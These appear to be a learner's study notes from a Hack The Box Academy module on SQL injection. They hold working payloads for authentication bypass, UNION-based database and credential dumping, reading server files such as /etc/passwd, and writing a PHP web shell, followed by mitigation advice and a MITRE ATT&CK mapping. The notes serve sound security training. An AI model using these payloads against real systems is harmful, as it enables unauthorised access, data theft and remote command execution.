# SQL Injection Fundamentals

**Platform:** Hack The Box Academy  
**Module:** SQL Injection Fundamentals  
**Sections:** 17  
**Difficulty:** Medium  
**Category:** Offensive Security / Web Application Penetration Testing  
**Goal:** Penetration Tester role in India | Target: January 2027

---

## Table of Contents

1. [Overview](#overview)
2. [Database Fundamentals](#database-fundamentals)
   - [Relational vs Non-Relational Databases](#relational-vs-non-relational-databases)
   - [MySQL Basics — Command Line](#mysql-basics--command-line)
   - [Creating Databases and Tables](#creating-databases-and-tables)
   - [Core SQL Statements — CRUD](#core-sql-statements--crud)
   - [Query Results — Sorting Filtering Limiting](#query-results--sorting-filtering-limiting)
   - [SQL Operators](#sql-operators)
3. [SQL Injection Fundamentals](#sql-injection-fundamentals-1)
   - [How SQLi Works](#how-sqli-works)
   - [Types of SQL Injection](#types-of-sql-injection)
4. [Authentication Bypass](#authentication-bypass)
   - [OR Operator Injection](#or-operator-injection)
   - [Comment-Based Bypass](#comment-based-bypass)
5. [UNION Injection](#union-injection)
   - [Detecting Column Count](#detecting-column-count)
   - [Identifying Visible Columns](#identifying-visible-columns)
6. [Database Enumeration](#database-enumeration)
   - [MySQL Fingerprinting](#mysql-fingerprinting)
   - [Enumerating Databases](#enumerating-databases)
   - [Enumerating Tables](#enumerating-tables)
   - [Enumerating Columns](#enumerating-columns)
   - [Dumping Data](#dumping-data)
7. [Reading Files via SQLi](#reading-files-via-sqli)
8. [Writing Files and Web Shell via SQLi](#writing-files-and-web-shell-via-sqli)
9. [SQLi Mitigation](#sqli-mitigation)
10. [Key Tools Reference](#key-tools-reference)
11. [MITRE ATT&CK Mapping](#mitre-attck-mapping)

---

## Overview

SQL injection (SQLi) is a code injection attack that manipulates SQL queries sent by a web application to its database. When user input is passed directly into an SQL query without sanitisation, an attacker can break out of the intended query context and execute arbitrary SQL — enabling anything from authentication bypass to full server compromise.

### Impact of SQL Injection

| Impact | Description |
|--------|-------------|
| **Authentication Bypass** | Log in as any user (including admin) without a valid password |
| **Data Exfiltration** | Read any table in any database — usernames, passwords, credit cards, PII |
| **Data Manipulation** | INSERT, UPDATE, DELETE arbitrary records |
| **File System Access** | Read sensitive files (`/etc/passwd`, source code, config files) |
| **Remote Code Execution** | Write a PHP web shell to the webroot → OS command execution |
| **Privilege Escalation** | Abuse high-privilege DB accounts to gain OS access |

> **Real-world note:** SQL injection breaches are responsible for a significant portion of credential database dumps that subsequently appear on paste sites and dark web markets, fuelling credential-stuffing attacks at scale.

---

## Database Fundamentals

### Relational vs Non-Relational Databases

| Feature | Relational (RDBMS) | Non-Relational (NoSQL) |
|---------|-------------------|----------------------|
| Structure | Tables, rows, columns | Key-Value, Document, Wide-Column, Graph |
| Query Language | SQL (standard) | Varies per database |
| Examples | MySQL, PostgreSQL, MSSQL, Oracle | MongoDB, Redis, Cassandra, Neo4j |
| Injection Type | SQL injection | NoSQL injection (separate module) |
| Relationships | Foreign keys, schemas | None (flexible structure) |

This module focuses on **MySQL/MariaDB** and Union-based SQL injection.

---

### MySQL Basics — Command Line

```bash
# Connect to local MySQL instance
Hackerpatel007_1@htb[/htb]$ mysql -u root -p

# Connect to a remote MySQL instance
Hackerpatel007_1@htb[/htb]$ mysql -u root -h docker.hackthebox.eu -P 3306 -p
```

> **Note:** Always use `-p` without the password in the command — enter it interactively. Passing the password in the command line stores it in bash history in plaintext.

---

### Creating Databases and Tables

```sql
-- Create a new database
mysql> CREATE DATABASE users;

-- List all databases
mysql> SHOW DATABASES;

-- Switch to a database
mysql> USE users;

-- Create a table with properties
CREATE TABLE logins (
    id INT NOT NULL AUTO_INCREMENT,
    username VARCHAR(100) UNIQUE NOT NULL,
    password VARCHAR(100) NOT NULL,
    date_of_joining DATETIME DEFAULT NOW(),
    PRIMARY KEY (id)
);

-- View table structure
mysql> DESCRIBE logins;

-- List tables in current database
mysql> SHOW TABLES;
```

**Table property keywords:**

| Property | Description |
|----------|-------------|
| `NOT NULL` | Column cannot be empty — required field |
| `AUTO_INCREMENT` | Integer auto-increments with each new row |
| `UNIQUE` | All values in the column must be distinct |
| `DEFAULT <value>` | Sets a default value if none is provided |
| `PRIMARY KEY` | Uniquely identifies each row — must be unique and NOT NULL |

---

### Core SQL Statements — CRUD

```sql
-- INSERT — add new records
INSERT INTO logins VALUES(1, 'admin', 'p@ssw0rd', '2020-07-02');
INSERT INTO logins (username, password) VALUES ('administrator', 'change_password');

-- SELECT — retrieve data
SELECT * FROM logins;                            -- all columns, all rows
SELECT username, password FROM logins;           -- specific columns
SELECT * FROM logins LIMIT 2;                    -- limit to 2 rows
SELECT * FROM logins LIMIT 1, 2;                 -- offset 1, return 2 rows

-- DROP — delete table or database (destructive)
DROP TABLE logins;
DROP DATABASE users;

-- ALTER — modify table structure
ALTER TABLE logins ADD newColumn INT;
ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn;
ALTER TABLE logins MODIFY oldColumn DATE;
ALTER TABLE logins DROP oldColumn;

-- UPDATE — modify existing records
UPDATE logins SET password = 'change_password' WHERE id > 1;
```

> **Critical:** Always use `WHERE` with `UPDATE` and `DELETE`. Without it, all rows in the table are affected.

---

### Query Results — Sorting Filtering Limiting

```sql
-- ORDER BY — sort ascending (default)
SELECT * FROM logins ORDER BY password;

-- ORDER BY — sort descending
SELECT * FROM logins ORDER BY password DESC;

-- ORDER BY — multi-column sort (secondary sort on ties)
SELECT * FROM logins ORDER BY password DESC, id ASC;

-- WHERE — filter by condition
SELECT * FROM logins WHERE id > 1;
SELECT * FROM logins WHERE username = 'admin';

-- LIKE — pattern matching
SELECT * FROM logins WHERE username LIKE 'admin%';    -- starts with "admin"
SELECT * FROM logins WHERE username LIKE '___';       -- exactly 3 characters
```

**LIKE wildcard characters:**

| Character | Meaning |
|-----------|--------|
| `%` | Wildcard — matches zero or more characters |
| `_` | Matches exactly one character |

---

### SQL Operators

```sql
-- AND — both conditions must be true
SELECT * FROM logins WHERE username != 'john' AND id > 1;

-- OR — at least one condition must be true
SELECT * FROM logins WHERE username = 'admin' OR username = 'tom';

-- NOT — inverts the boolean result
SELECT * FROM logins WHERE NOT id = 1;

-- Symbol equivalents
-- AND = &&    OR = ||    NOT = !
SELECT * FROM logins WHERE username != 'john' && id > 3 - 2;
```

**Operator Precedence (high to low):**

```
Division (/) Multiplication (*) Modulus (%)
Addition (+) Subtraction (-)
Comparison (=, >, <, <=, >=, !=, LIKE)
NOT (!)
AND (&&)
OR (||)
```

> **Why precedence matters for SQLi:** In `WHERE username='admin' OR '1'='1' AND password='something'` — AND evaluates before OR. Understanding this is critical for crafting correct auth bypass payloads.

---

## SQL Injection Fundamentals

### How SQLi Works

When user input is inserted directly into an SQL query string without sanitisation, an attacker can inject SQL syntax that changes the query's logic or appends additional queries.

**Vulnerable PHP code:**

```php
$searchInput = $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);
```

**Normal behaviour:** Input `admin` → `select * from logins where username like '%admin'`

**Injected:** Input `1'; DROP TABLE users;--` → `select * from logins where username like '%1'; DROP TABLE users;--'`

The single quote `'` breaks out of the string context, `;` terminates the original query, the injected `DROP TABLE` executes as a second query, and `--` comments out the trailing `'` to prevent a syntax error.

> **Note:** In MySQL, stacked queries using `;` are not supported via the standard PHP `mysqli_query()` function. They work in MSSQL and PostgreSQL. MySQL injections use UNION-based or comment-based techniques instead.

---

### Types of SQL Injection

| Type | Sub-Type | Output Method |
|------|----------|--------------|
| **In-band** | Union-Based | Results displayed directly in the page |
| **In-band** | Error-Based | DB errors returned in the page contain query output |
| **Blind** | Boolean-Based | Page behaviour (content/no content) reveals true/false |
| **Blind** | Time-Based | `SLEEP()` delays reveal true/false when no output exists |
| **Out-of-band** | — | Results sent to external server (DNS, HTTP) |

This module focuses on **Union-Based SQLi** — the most visible and beginner-friendly injection type.

---

## Authentication Bypass

### SQLi Discovery

Test these payloads in login form fields to detect injection:

| Payload | URL Encoded | Effect |
|---------|------------|--------|
| `'` | `%27` | Odd number of quotes → syntax error |
| `"` | `%22` | Same with double-quoted queries |
| `#` | `%23` | Comment character test |
| `;` | `%3B` | Statement terminator test |
| `)` | `%29` | Closing parenthesis test |

A SQL syntax error in response confirms the input is not sanitised and the application is injectable.

---

### OR Operator Injection

**Target query:**

```sql
SELECT * FROM logins WHERE username='INPUT' AND password='INPUT';
```

**Goal:** Make the WHERE clause evaluate to TRUE regardless of input.

```sql
-- Inject into username field — known username
admin' or '1'='1

-- Resulting query (AND evaluates before OR):
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password='something';
-- Evaluates as: (username='admin') OR ('1'='1' AND password='something')
-- = TRUE OR FALSE = TRUE → logs in as admin
```

```sql
-- Inject into both fields — no username required
' or '1' = '1          -- username field
' or '1' = '1          -- password field

-- Resulting query:
SELECT * FROM logins WHERE username='' OR '1'='1' AND password='something' OR '1'='1';
-- All OR conditions make the whole expression TRUE → logs in as first user in the table
```

---

### Comment-Based Bypass

SQL comments comment out the rest of the query after the injection point — eliminating the need to balance quotes or satisfy other conditions.

```sql
-- MySQL comment styles:
-- (two dashes + space)    — must have space after --
#                          — hash symbol (URL encode as %23 in browser URL bar)
/* ... */                  -- inline comment (less common in basic SQLi)
```

**Standard admin bypass:**

```sql
-- Inject: admin'--
-- Resulting query:
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
-- Everything after -- is ignored → only username is checked
```

**Bypass with parentheses in the query:**

```sql
-- Original query:
SELECT * FROM logins WHERE (username='admin' AND id > 1) AND password='hash';

-- admin'-- fails because it leaves an unbalanced parenthesis:
SELECT * FROM logins WHERE (username='admin'-- AND id > 1) AND password='hash';
-- SYNTAX ERROR

-- Correct bypass — close the parenthesis before commenting:
-- Inject: admin')--
SELECT * FROM logins WHERE (username='admin')-- AND id > 1) AND password='hash';
-- Syntactically valid, logs in as admin
```

> **Key concept:** Always balance parentheses when the query uses them. View the error message or use trial-and-error to determine the parenthesis nesting depth.

---

## UNION Injection

UNION injection appends an additional SELECT statement to the original query, enabling retrieval of data from completely different tables — even different databases.

**UNION rules:**
1. The injected SELECT must return the **same number of columns** as the original query
2. The data types in matching column positions must be compatible
3. Only columns that are **displayed in the page output** can carry injected data

---

### Detecting Column Count

**Method 1 — ORDER BY (increment until error):**

```sql
-- Inject increasing column numbers until an error occurs
' order by 1-- -    -- success
' order by 2-- -    -- success
' order by 3-- -    -- success
' order by 4-- -    -- success
' order by 5-- -    -- ERROR: "Unknown column '5' in order clause"
-- Conclusion: table has 4 columns
```

**Method 2 — UNION SELECT (increment until success):**

```sql
cn' UNION select 1,2,3-- -       -- ERROR: column count mismatch
cn' UNION select 1,2,3,4-- -     -- SUCCESS: 4 columns confirmed
```

---

### Identifying Visible Columns

Not all columns are displayed on the page. Use numeric placeholders to determine which column positions appear in the output:

```sql
-- 4-column table — which of 1,2,3,4 appear in the page?
cn' UNION select 1,2,3,4-- -
```

If the page shows `2, 3, 4` but not `1`, then column 1 is used internally (e.g., as an ID). Place injection payloads in columns 2, 3, or 4.

**Confirm with a real query:**

```sql
-- Test with @@version in column 2
cn' UNION select 1,@@version,3,4-- -
-- If the MariaDB version string appears, column 2 is injectable
```

---

## Database Enumeration

### MySQL Fingerprinting

Identify the DBMS before proceeding — each database has slightly different syntax.

| Payload | Use When | MySQL Output | Other DBMS |
|---------|----------|-------------|------------|
| `SELECT @@version` | Full output available | `10.3.22-MariaDB-1ubuntu1` | MSSQL returns MSSQL version; others error |
| `SELECT POW(1,1)` | Numeric output only | `1` | Error on others |
| `SELECT SLEEP(5)` | Blind (no output) | 5-second page delay | No delay on others |

---

### Enumerating Databases

```sql
-- List all databases on the server
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -

-- Find the currently active database
cn' UNION select 1,database(),2,3-- -
```

```
Output: ilfreight, dev
(ignore default system DBs: information_schema, mysql, performance_schema, sys)
```

---

### Enumerating Tables

```sql
-- List all tables in a specific database (e.g., 'dev')
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

```
Output:
credentials  | dev
user_info    | dev
```

---

### Enumerating Columns

```sql
-- List all columns in a specific table (e.g., 'credentials' in 'dev')
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

```
Output:
id       | credentials | dev
username | credentials | dev
password | credentials | dev
```

---

### Dumping Data

```sql
-- Dump all records from the target table
-- Use dot notation to reference a table in another database
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```

```
Output:
admin    | BBD30D6E4A6C24F7A8C3B5AEFA2A68CB
newuser  | 9DA2C9BCDF39D8610954E0E11EA8F45F
```

---

### Checking User Privileges

```sql
-- Check current DB user
cn' UNION SELECT 1, user(), 3, 4-- -

-- Check all grants for current user
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -

-- List all privileges for current user
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

If `FILE` privilege appears in the output, the database user can read (and potentially write) files on the server's file system.

---

## Reading Files via SQLi

Reading files requires:
1. `FILE` privilege for the DB user
2. The file must be readable by the OS user running MySQL

```sql
-- Read /etc/passwd via LOAD_FILE()
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -

-- Read web application source code
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```

**Common high-value targets for file reading:**

| File | Contents |
|------|----------|
| `/etc/passwd` | Local user accounts |
| `/etc/shadow` | Password hashes (root required) |
| `/var/www/html/config.php` | DB credentials, API keys |
| `/var/www/html/search.php` | Application source code |
| `/etc/apache2/apache2.conf` | Apache web root location |
| `/etc/nginx/nginx.conf` | Nginx configuration |
| `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config` | IIS configuration (Windows) |

> **Key concept:** Reading source code via SQLi reveals database credentials hardcoded in PHP config files, enabling direct database connections outside of the web application context.

---

## Writing Files and Web Shell via SQLi

Writing files requires three conditions:
1. `FILE` privilege for the DB user
2. `secure_file_priv` variable is empty (not restricted to a specific directory)
3. Write access to the target directory

**Check `secure_file_priv`:**

```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables WHERE variable_name="secure_file_priv"-- -
```

```
Output: SECURE_FILE_PRIV | (empty)
-- Empty value = can read/write anywhere MySQL user has OS permissions
-- NULL = cannot read/write anywhere
-- /var/lib/mysql-files = restricted to that directory only
```

**Write a test file:**

```sql
-- Basic file write via INTO OUTFILE
select 'this is a test' INTO OUTFILE '/tmp/test.txt';

-- Write via UNION injection
cn' UNION SELECT 1,'file written successfully!',3,4 INTO OUTFILE '/var/www/html/proof.txt'-- -
```

**Write a PHP Web Shell:**

```sql
-- PHP one-liner web shell — executes OS commands via $_REQUEST[0]
cn' UNION SELECT "","<?php system($_REQUEST[0]); ?>", "", "" INTO OUTFILE '/var/www/html/shell.php'-- -
```

**Execute Commands via Web Shell:**

```
http://10.129.85.14:5000/shell.php?0=id

Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Confirmed OS command execution as the web server user (`www-data`). The attacker now has a persistent command execution foothold on the server.

> **Advanced file write:** Use `FROM_BASE64("base64_data")` to write binary files or files with special characters that would otherwise cause issues in the SQL query string.

---

## SQLi Mitigation

### Input Sanitisation

**Vulnerable PHP (direct insertion):**

```php
$username = $_POST['username'];
$query = "SELECT * FROM logins WHERE username='" . $username . "' AND password = '" . $password . "';" ;
```

**Mitigated PHP (escape special characters):**

```php
$username = mysqli_real_escape_string($conn, $_POST['username']);
$password = mysqli_real_escape_string($conn, $_POST['password']);
$query = "SELECT * FROM logins WHERE username='" . $username . "' AND password = '" . $password . "';" ;
```

`mysqli_real_escape_string()` escapes `'`, `"`, `\`, `NULL`, and other special characters — preventing them from being interpreted as SQL syntax.

---

### Input Validation

Validate that input matches the expected format before using it in a query:

```php
// Example: port_code must only contain letters and spaces
$pattern = "/^[A-Za-z\s]+$/";
$code = $_GET["port_code"];

if (!preg_match($pattern, $code)) {
    die("Invalid input! Please try again.");
}

$q = "Select * from ports where port_code ilike '%" . $code . "%'";
```

Input that fails validation is rejected before ever reaching the SQL query.

---

### Parameterized Queries (Prepared Statements)

The most robust defence. Separates SQL code from data — user input is never interpreted as SQL syntax regardless of its content:

```php
$username = $_POST['username'];
$password = $_POST['password'];

// ? placeholders are filled safely by the driver
$query = "SELECT * FROM logins WHERE username=? AND password = ?";
$stmt = mysqli_prepare($conn, $query);
mysqli_stmt_bind_param($stmt, 'ss', $username, $password);
mysqli_stmt_execute($stmt);
$result = mysqli_stmt_get_result($stmt);
```

The `mysqli_stmt_bind_param()` function escapes all special characters and places the values as data — not as SQL code. Even `' OR '1'='1` is treated as a literal string, not SQL logic.

---

### Principle of Least Privilege

Never connect web applications to the database using a high-privilege account:

```sql
-- Create a restricted user for the web application
MariaDB [(none)]> CREATE USER 'reader'@'localhost';
MariaDB [(none)]> GRANT SELECT ON ilfreight.ports TO 'reader'@'localhost' IDENTIFIED BY 'p@ssw0Rd!!';
```

```bash
# Verify the restriction — reader cannot access other tables
Hackerpatel007_1@htb[/htb]$ mysql -u reader -p

MariaDB [ilfreight]> SELECT * FROM ilfreight.credentials;
ERROR 1142 (42000): SELECT command denied to user 'reader'@'localhost' for table 'credentials'
```

If the application only needs to SELECT from one table, the `reader` user limits the blast radius of a successful SQLi — the attacker cannot dump all databases, write files, or escalate further.

---

### Web Application Firewall

WAFs intercept HTTP requests and block those containing known SQLi patterns. Common blocked strings include:

- `INFORMATION_SCHEMA`
- `UNION SELECT`
- `OR '1'='1'`
- `LOAD_FILE`
- `INTO OUTFILE`

**Open-source:** ModSecurity  
**Commercial/Cloud:** Cloudflare, AWS WAF, Imperva

> **Limitation:** WAFs can be bypassed with encoding, case variation, whitespace injection, and alternative syntax. They are a defence-in-depth layer, not a primary control — parameterised queries are.

---

## Key Tools Reference

| Command | Purpose |
|---------|--------|
| `mysql -u root -p` | Connect to local MySQL instance |
| `mysql -u root -h <host> -P 3306 -p` | Connect to remote MySQL instance |
| `SHOW DATABASES;` | List all databases |
| `USE <database>;` | Switch to a database |
| `SHOW TABLES;` | List tables in current database |
| `DESCRIBE <table>;` | Show table structure |
| `SELECT * FROM <table>;` | Dump all records from a table |
| `' order by N-- -` | Detect number of columns via ORDER BY |
| `' UNION select 1,2,...,N-- -` | Detect number of columns via UNION |
| `cn' UNION select 1,@@version,3,4-- -` | Fingerprint MySQL version |
| `cn' UNION select 1,database(),3,4-- -` | Identify current database |
| `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -` | List all databases |
| `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -` | List tables in a database |
| `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,4 from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -` | List columns in a table |
| `cn' UNION select 1,username,password,4 from dev.credentials-- -` | Dump data from target table |
| `cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -` | Check current user privileges |
| `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -` | Read a file from the server |
| `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables WHERE variable_name="secure_file_priv"-- -` | Check write file restrictions |
| `cn' UNION SELECT "","<?php system($_REQUEST[0]); ?>","","" INTO OUTFILE '/var/www/html/shell.php'-- -` | Write PHP web shell |
| `http://TARGET/shell.php?0=id` | Execute OS command via web shell |

---

## MITRE ATT&CK Mapping

| Technique | Sub-Technique | Description |
|-----------|---------------|-------------|
| T1190 | — | Exploit Public-Facing Application — SQLi via web form or URL parameter |
| T1078 | T1078.001 | Valid Accounts: Default Accounts — bypassing auth without valid credentials via OR injection |
| T1083 | — | File and Directory Discovery — LOAD_FILE to read `/etc/passwd`, web config files |
| T1552 | T1552.001 | Unsecured Credentials: Credentials in Files — reading database credentials from PHP source code via LOAD_FILE |
| T1005 | — | Data from Local System — dumping user tables, credentials tables via UNION injection |
| T1059 | T1059.004 | Command and Scripting Interpreter: Unix Shell — OS command execution via written PHP web shell |
| T1505 | T1505.003 | Server Software Component: Web Shell — writing `shell.php` to webroot via `INTO OUTFILE` |
| T1548 | — | Abuse Elevation Control Mechanism — exploiting high-privilege DB accounts (`root`, `FILE` privilege) to access OS-level file operations |
| T1564 | T1564.003 | Hide Artifacts: NTFS File Attributes — appending junk data around web shell content in OUTFILE |

---

*Module completed as part of the HTB Academy CPTS path.*  
*Penetration Tester role in India | Target: January 2027*
